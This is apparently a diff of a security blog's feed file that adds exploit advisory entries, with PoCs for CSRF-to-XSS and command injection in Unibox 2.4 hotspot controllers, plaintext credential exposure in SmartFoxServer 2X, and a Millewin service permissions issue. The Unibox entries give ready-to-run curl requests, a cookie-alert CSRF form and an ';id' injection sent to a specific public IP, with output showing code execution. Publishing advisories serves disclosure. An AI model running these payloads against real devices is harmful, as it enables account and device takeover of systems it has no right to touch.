TIPO                      : 10  WIN32_OWN_PROCESS<br>        TIPO_AVVIO                : 2   AUTO_START<br>        CONTROLLO_ERRORE          : 1   NORMAL<br>        NOME_PERCORSO_BINARIO     : C:\Program Files (x86)\Millewin\WatchDogService.exe<br>        GRUPPO_ORDINE_CARICAMENTO :<br>        TAG                       : 0<br>        NOME_VISUALIZZATO         : PDS Server<br>        DIPENDENZE                :<br>        SERVICE_START_NAME : LocalSystem<br><br><br>(3) Folder permissions.<br>Insecure folders permissions issue:<br><br>C:\Program Files (x86)\Millewin <br>                                BUILTIN\Users:(OI)(CI)(F)<br>                                Everyone:(OI)(CI)(F)<br>                                NT SERVICE\TrustedInstaller:(I)(F)<br>                                NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)<br>                                NT AUTHORITY\SYSTEM:(I)(F)<br>                                NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)<br>                                BUILTIN\Administrators:(I)(F)<br>                                BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)<br>                                BUILTIN\Users:(I)(RX)<br>                BUILTIN\Users:(OI)(CI)(IO)(ID)(accesso speciale:)<br>                                                              GENERIC_READ<br>                                                              GENERIC_EXECUTE<br>                                ...[SNIP]...<br><br>C:\Program Files (x86)\Millewin\MilleUpdater <br>                                             BUILTIN\Users:(OI)(CI)(ID)F<br>                       Everyone:(OI)(CI)(ID)F<br>                                             NT SERVICE\TrustedInstaller:(ID)F<br>                                             NT SERVICE\TrustedInstaller:(CI)(IO)(ID)F<br>                                             NT AUTHORITY\SYSTEM:(ID)F<br>                                             NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(ID)F<br>                                             BUILTIN\Administrators:(ID)F<br>                                             BUILTIN\Administrators:(OI)(CI)(IO)(ID)F<br>                                             BUILTIN\Users:(OI)(CI)(IO)(ID)(accesso speciale:)<br>                                                                           GENERIC_READ<br>                                                                           GENERIC_EXECUTE<br>                                ...[SNIP]...<br><br></code></pre></div></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Exploit </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Insecure Permissions </tag>
+            
+            <tag> Unquoted Service Path </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Unibox Cross Site Request Forgery</title>
+      <link href="2021/02/09/Unibox-Cross-Site-Request-Forgery/"/>
+      <url>2021/02/09/Unibox-Cross-Site-Request-Forgery/</url>
+      
+        <content type="html"><![CDATA[<hr><h4 id="Cross-Site-Request-Forgery"><a href="#Cross-Site-Request-Forgery" class="headerlink" title="Cross Site Request Forgery"></a>Cross Site Request Forgery</h4><p>Various Unibox products suffers from a cross site request forgery vulnerability.</p><figure class="highlight xquery"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xquery">About the Product:<br>==================<br>UniBox <span class="hljs-literal">is</span> one <span class="hljs-keyword">of</span> the most innovative <span class="hljs-keyword">and</span> reliable Hotspot Controllers <span class="hljs-keyword">in</span><br>the market today. You can install UniBox <span class="hljs-keyword">to</span> manage any sized WiFi<br>network without having <span class="hljs-keyword">to</span><span class="hljs-built_in"> replace</span> any existing infrastructure. With<br>UniBox, you don<span class="hljs-string">&#x27;t need any other solution for managing WiFi access. It</span><br><span class="hljs-string">comes packed with features so just one box is enough to handle all the</span><br><span class="hljs-string">functions of WiFi hotspots.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Description:</span><br><span class="hljs-string">============</span><br><span class="hljs-string">An issue was discovered on Unibox U-50 with version Unibox 2.4 and</span><br><span class="hljs-string">poterntially respected all other  devices. There is CSRF via</span><br><span class="hljs-string">/tools/network-trace with resultant XSS due to  lack of csrf token and</span><br><span class="hljs-string">user input validation.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Additional Information</span><br><span class="hljs-string">======================</span><br><span class="hljs-string">The web interface of the SMB Unibox  does not validate the csrftoken,and</span><br><span class="hljs-string">the /tools/network-trace  page does not properly sanitize the</span><br><span class="hljs-string">user input which leads to xss, By combining this two attack we can form</span><br><span class="hljs-string">the XSRF request which leads to complete account takeover using XSRF.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[Vulnerability Type]</span><br><span class="hljs-string">====================</span><br><span class="hljs-string">Cross Site Request Forgery (CSRF)</span><br><span class="hljs-string"></span><br><span class="hljs-string">How to Reproduce: (POC):</span><br><span class="hljs-string">========================</span><br><span class="hljs-string">curl -i -s -k  -X $&#x27;</span>POST<span class="hljs-string">&#x27; \</span><br><span class="hljs-string">    -H $&#x27;</span>Host: <span class="hljs-string">&#x27;IP-OF-Device&#x27;</span> -H $<span class="hljs-string">&#x27;User-Agent: Mozilla/5.0 (X11; Linux</span><br><span class="hljs-string">x86_64; rv:68.0) Gecko/20100101 Firefox/68.0&#x27;</span> -H $<span class="hljs-string">&#x27;Accept:</span><br><span class="hljs-string">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span> -H<br>$<span class="hljs-string">&#x27;Accept-Language: en-US,en;q=0.5&#x27;</span> -H $<span class="hljs-string">&#x27;Accept-Encoding: gzip, deflate&#x27;</span><br>-H $<span class="hljs-string">&#x27;Referer: http://IP-OF-Device/tools/network-trace&#x27;</span> -H<br>$<span class="hljs-string">&#x27;Content-Type: application/x-www-form-urlencoded&#x27;</span> -H $<span class="hljs-string">&#x27;Content-Length:</span><br><span class="hljs-string">130&#x27;</span> -H $<span class="hljs-string">&#x27;Connection: close&#x27;</span> -H $<span class="hljs-string">&#x27;Cookie:</span><br><span class="hljs-string">PHPSESSID=86i9fsqxxxxxxxxxxxxxx&#x27;</span> -H $<span class="hljs-string">&#x27;Upgrade-Insecure-Requests: 1&#x27;</span> \<br>    -b $<span class="hljs-string">&#x27;PHPSESSID=86i9fsq22vi4vxxxxxxxxxxxx&#x27;</span> \<br>    --data-binary<br>$<span class="hljs-string">&#x27;port=lan&amp;duration=600&amp;noofpackets=100&amp;sizelimit=128&amp;filter=%22%2F%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&amp;formsubmit=Start+Trace&#x27;</span><br>\<br>    $<span class="hljs-string">&#x27;http://ip-of-device/tools/network-trace&#x27;</span><br><br>Vulnerable Pages <span class="hljs-keyword">to</span> XSS :- http://xxx.xxx.xx.xx/authentication/list_users<br>          <br>http://xxx.xxx.xx.xx/authentication/list_byod?usertype=raduser<br>               http://xxx.xxx.xx.xx/reports/dhcp_leases<br>               http://xxx.xxx.xx.xx/go?rid=<span class="hljs-number">202</span><br>CSRF POC<br>--------<br><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="xml">  </span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="xml">  </span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">history.pushState(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="xml">    </span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://ip-of-device/tools/network-trace&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span></span><br><span class="xml">      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;port&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;lan&quot;</span> /&gt;</span></span><br><span class="xml">      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;duration&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;600&quot;</span> /&gt;</span></span><br><span class="xml">      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;noofpackets&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;100&quot;</span> /&gt;</span></span><br><span class="xml">      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;sizelimit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;128&quot;</span> /&gt;</span></span><br><span class="xml">      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;filter&quot;</span></span></span><br><span class="xml">value=&quot;&quot;/&gt;</span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><span class="xml">&quot; /&gt;</span><br><span class="xml">      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;formsubmit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Start Trace&quot;</span> /&gt;</span></span><br><span class="xml">      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br><br><br>[Affected Component]<br>/tools/network-trace <span class="hljs-keyword">and</span> CSRF Vulnerabilities,<br></code></pre></div></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Exploit </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Cross Site Request Forgery </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>SmartFoxServer 2X 2.17.0 Credential Disclosure</title>
+      <link href="2021/02/09/SmartFoxServer-2X-2-17-0-Credential-Disclosure/"/>
+      <url>2021/02/09/SmartFoxServer-2X-2-17-0-Credential-Disclosure/</url>
+      
+        <content type="html"><![CDATA[<h4 id="SmartFoxServer-2X-2-17-0-Credentials-Disclosure"><a href="#SmartFoxServer-2X-2-17-0-Credentials-Disclosure" class="headerlink" title="SmartFoxServer 2X 2.17.0 Credentials Disclosure"></a>SmartFoxServer 2X 2.17.0 Credentials Disclosure</h4><p>SmartFoxServer 2X version 2.17.0 suffers from a credential disclosure vulnerability</p><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">PS C:\Users\t00t\SmartFoxServer_2X\SFS2X\config&gt; <span class="hljs-keyword">Get</span>-Content <span class="hljs-keyword">server</span>.xml | <span class="hljs-keyword">Select</span>-String -Pattern passw -Context <span class="hljs-number">1</span>,<span class="hljs-number">0</span><br><br>          &lt;<span class="hljs-keyword">login</span>&gt;sfsadmin&lt;/<span class="hljs-keyword">login</span>&gt;<br>&gt;         &lt;<span class="hljs-keyword">password</span>&gt;Waddup&lt;/<span class="hljs-keyword">password</span>&gt;<br>          &lt;<span class="hljs-keyword">login</span>&gt;testingus&lt;/<span class="hljs-keyword">login</span>&gt;<br>&gt;         &lt;<span class="hljs-keyword">password</span>&gt;<span class="hljs-number">123456</span>&lt;/<span class="hljs-keyword">password</span>&gt;<br>      &lt;mailUser&gt;username&lt;/mailUser&gt;<br>&gt;     &lt;mailPass&gt;<span class="hljs-keyword">password</span>&lt;/mailPass&gt;<br><br><br>C:\Users\t00t\SmartFoxServer_2X\SFS2X\config&gt;icacls <span class="hljs-keyword">server</span>.xml<br><span class="hljs-keyword">server</span>.xml NT AUTHORITY\<span class="hljs-keyword">SYSTEM</span>:(I)(F)<br>           BUILTIN\Administrators:(I)(F)<br>           LAB42\t00t:(I)(F)<br></code></pre></div></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Exploit </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Credential Disclosure </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Unibox 2.4 CSRF / Remote Code Execution</title>
+      <link href="2021/02/09/Unibox-2-4-CSRF-Remote-Code-Execution/"/>
+      <url>2021/02/09/Unibox-2-4-CSRF-Remote-Code-Execution/</url>
+      
+        <content type="html"><![CDATA[<h4 id="Unibox-2-4-CSRF-Remote-Code-Execution"><a href="#Unibox-2-4-CSRF-Remote-Code-Execution" class="headerlink" title="Unibox 2.4 CSRF / Remote Code Execution"></a>Unibox 2.4 CSRF / Remote Code Execution</h4><p>Unibox version 2.4 suffers from remote code execution and cross site request forgery vulnerabilities.</p><figure class="highlight asciidoc"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asciidoc">About the Product:<br>==================<br>UniBox is one of the most innovative and reliable Hotspot Controllers in<br>the market today. You can install UniBox to manage any sized WiFi<br>network without having to replace any existing infrastructure. With<br>UniBox, you don&#x27;t need any other solution for managing WiFi access. It<br>comes packed with features so just one box is enough to handle all the<br>functions of WiFi hotspots.<br><br>Description:<br>============<br>An issue was discovered on Unibox SMB with Unibox 2.4 and poterntially<br>respected all other  devices. There is Code Execution vulnerability via<br>/tools/ping Function in device which leads to complete device takeover.<br><br>Additional Information<br>======================<br>The page /tools/ping can be tricked via specially crafted request which<br>will leads to the code execution on device also device  does not<br>validate the csrftoken,hence By combining this two attack we can form<br>the Authencated remote code execution on device leads to complete device<br>takeover.<br><br><span class="hljs-meta">[Vulnerability Type]</span><br>====================<br>Remote Code Execution (RCE)<br>Cross Site Request Forgery (CSRF)<br><br>How to Reproduce: (POC):<br>========================<br>curl -i -s -k  -X $<span class="hljs-emphasis">&#x27;POST&#x27;</span> \<br><span class="hljs-code">    -H $&#x27;Host: 136.232.224.22&#x27; -H $&#x27;User-Agent: Mozilla/5.0 (X11; Linux</span><br>x86_64; rv:68.0) Gecko/20100101 Firefox/68.0&#x27; -H $<span class="hljs-emphasis">&#x27;Accept:</span><br><span class="hljs-emphasis">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span> -H<br>$<span class="hljs-emphasis">&#x27;Accept-Language: en-US,en;q=0.5&#x27;</span> -H $<span class="hljs-emphasis">&#x27;Accept-Encoding: gzip, deflate&#x27;</span><br>-H $<span class="hljs-emphasis">&#x27;Referer: http://136.232.224.22/tools/ping&#x27;</span> -H $<span class="hljs-emphasis">&#x27;Content-Type:</span><br><span class="hljs-emphasis">application/x-www-form-urlencoded&#x27;</span> -H $<span class="hljs-emphasis">&#x27;Content-Length: 25&#x27;</span> -H<br>$<span class="hljs-emphasis">&#x27;Connection: close&#x27;</span> -H $<span class="hljs-emphasis">&#x27;Cookie: PHPSESSID=k4l9or0l5xxxxxxxxxxx&#x27;</span> -H<br>$<span class="hljs-emphasis">&#x27;Upgrade-Insecure-Requests: 1&#x27;</span> \<br><span class="hljs-code">    -b $&#x27;PHPSESSID=k4l9oxxxxxxxxxx&#x27; \</span><br><span class="hljs-code">    --data-binary $&#x27;pingaction=1&amp;address=1;id&#x27; \</span><br><span class="hljs-code">    $&#x27;http://136.232.224.22/tools/ping&#x27;</span><br><br>Sample OutPut<br>-------------<br>&lt;table width=100%&gt;<br><span class="hljs-code">        &lt;tr&gt;</span><br><span class="hljs-code">          &lt;td&gt;</span><br><span class="hljs-code">        &lt;br&gt;</span><br><span class="hljs-code">          &lt;/td&gt;</span><br><span class="hljs-code">        &lt;/tr&gt;</span><br><span class="hljs-code">        &lt;tr&gt;</span><br><span class="hljs-code">          &lt;td id=&#x27;pingResponseTable&#x27;&gt;</span><br><span class="hljs-code">        &lt;table border=&quot;1&quot;  bordercolordark=&#x27;#E0E0E0&#x27;</span><br>bordercolorlight=<span class="hljs-emphasis">&#x27;#000000&#x27;</span> class=&quot;search&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot;&gt;<br><span class="hljs-code">          &lt;tr style=&#x27;background-color:#3F6C96&#x27;&gt;</span><br><span class="hljs-code">            &lt;td&gt;</span><br><span class="hljs-code">              &lt;font color=&quot;white&quot;&gt;</span><br><span class="hljs-code">            &lt;b&gt; Ping Status&lt;/b&gt;</span><br><span class="hljs-code">              &lt;/font&gt;</span><br><span class="hljs-code">            &lt;/td&gt;</span><br><span class="hljs-code">            &lt;br&gt;</span><br><span class="hljs-code">          &lt;/tr&gt;</span><br><span class="hljs-code">          &lt;tr style=&#x27;background-color:#D8E4F8&#x27;&gt;</span><br><span class="hljs-code">            &lt;td&gt;uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="hljs-code">              &lt;br&gt;</span><br><span class="hljs-code">            &lt;/td&gt;</span><br><span class="hljs-code">          &lt;/tr&gt;</span><br><span class="hljs-code">        &lt;/table&gt;</span><br><br><br><span class="hljs-meta">[Affected Component]</span><br>/tools/ping<br><br>------------------------------------------<br><br><span class="hljs-meta">[Attack Type]</span><br>Remote<br><br>------------------------------------------<br><br></code></pre></div></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Exploit </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Remote Code Execution </tag>
+            
+            <tag> CSRF </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Car Rental Project 2.0 Shell Upload</title>
       <link href="2021/02/05/Car-Rental-Project-2-0-Shell-Upload/"/>
       <url>2021/02/05/Car-Rental-Project-2-0-Shell-Upload/</url>
